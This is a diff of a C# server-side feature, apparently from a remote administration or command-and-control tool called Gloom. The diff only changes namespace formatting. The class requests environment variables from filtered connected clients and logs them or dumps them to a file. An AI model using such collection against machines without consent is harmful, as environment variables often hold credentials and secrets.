@@ -1,52 +1,54 @@
 ﻿using Serilog;
 
-namespace Gloom.Server.Features.InfoCollector;
-internal class EnvVarsCollector : FeatureBase
+namespace Gloom.Server.Features.InfoCollector
 {
-	public override Guid[] AcceptedOps => new Guid[] { OpCodes.EnvVarsResponse };
-	private string? saveToSpecificFile = null;
-
-	public EnvVarsCollector(IMessageSender sender) : base(sender, "env")
+	internal class EnvVarsCollector : FeatureBase
 	{
+		public override Guid[] AcceptedOps => new Guid[] { OpCodes.EnvVarsResponse };
+		private string? saveToSpecificFile = null;
 
-	}
-
-	public override async Task HandleAsync(Client client, Guid op, byte[] data)
-	{
-		var str = data.Deserialize<OpStructs.EnvVarsResponse>();
-		if (!string.IsNullOrEmpty(saveToSpecificFile))
+		public EnvVarsCollector(IMessageSender sender) : base(sender, "env")
 		{
-			using var writer = File.AppendText(saveToSpecificFile);
-			foreach ((var key, var value) in str.Map)
-				await writer.WriteLineAsync($"{key} = {value}");
+
 		}
-		else
-		{
-			foreach ((var key, var value) in str.Map)
-				Log.Information("[EnvVars of {client}] {key} = {value}", client, key, value);
-		}
-	}
 
-	public override async Task<bool> HandleCommandAsync(string[] args)
-	{
-		if (args.Length == 0)
-			return false;
-		var filter = Filter.Parse(args[0]);
-		var count = await SendAsync(filter, OpCodes.EnvVarsRequest, new OpStructs.EnvVarsRequest());
-		if (args.Length >= 2 && !string.IsNullOrWhiteSpace(args[1]))
+		public override async Task HandleAsync(Client client, Guid op, byte[] data)
 		{
-			try
+			var str = data.Deserialize<OpStructs.EnvVarsResponse>();
+			if (!string.IsNullOrEmpty(saveToSpecificFile))
 			{
-				saveToSpecificFile = Path.GetFullPath(args[1]);
+				using var writer = File.AppendText(saveToSpecificFile);
+				foreach ((var key, var value) in str.Map)
+					await writer.WriteLineAsync($"{key} = {value}");
 			}
-			catch
+			else
 			{
-				//https://stackoverflow.com/questions/3137097/check-if-a-string-is-a-valid-windows-directory-folder-path
-				saveToSpecificFile = $"Environment variable list dump on {DateTime.Now:yyyy-MM-dd-HH-mm-ss.ffff}";
+				foreach ((var key, var value) in str.Map)
+					Log.Information("[EnvVars of {client}] {key} = {value}", client, key, value);
 			}
 		}
 
-		Log.Information("Sent environment variable list request to total {count} clients.", count);
-		return true;
+		public override async Task<bool> HandleCommandAsync(string[] args)
+		{
+			if (args.Length == 0)
+				return false;
+			var filter = Filter.Parse(args[0]);
+			var count = await SendAsync(filter, OpCodes.EnvVarsRequest, new OpStructs.EnvVarsRequest());
+			if (args.Length >= 2 && !string.IsNullOrWhiteSpace(args[1]))
+			{
+				try
+				{
+					saveToSpecificFile = Path.GetFullPath(args[1]);
+				}
+				catch
+				{
+					//https://stackoverflow.com/questions/3137097/check-if-a-string-is-a-valid-windows-directory-folder-path
+					saveToSpecificFile = $"Environment variable list dump on {DateTime.Now:yyyy-MM-dd-HH-mm-ss.ffff}";
+				}
+			}
+
+			Log.Information("Sent environment variable list request to total {count} clients.", count);
+			return true;
+		}
 	}
 }
